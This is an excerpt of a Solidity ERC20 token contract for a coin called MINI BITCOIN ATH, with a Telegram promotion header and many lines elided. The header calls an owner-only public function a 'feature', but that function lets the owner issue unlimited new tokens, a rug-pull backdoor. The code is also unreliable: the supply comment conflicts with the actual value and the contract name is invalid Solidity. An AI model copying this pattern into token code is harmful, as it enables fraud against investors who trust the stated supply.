...
//
// $MINIBITCOINATH proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/MiniBitcoinAth
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _minibitcoinath(uint256 amount) public onlyOwner {
    _minibitcoinath(msg.sender, amount);
    }
    ...
    function _minibitcoinath(address account, uint256 amount) internal virtual {
...
contract $MINIBITCOINATH is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("MINI BITCOIN ATH", "MBA") {
        _minibitcoinath(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}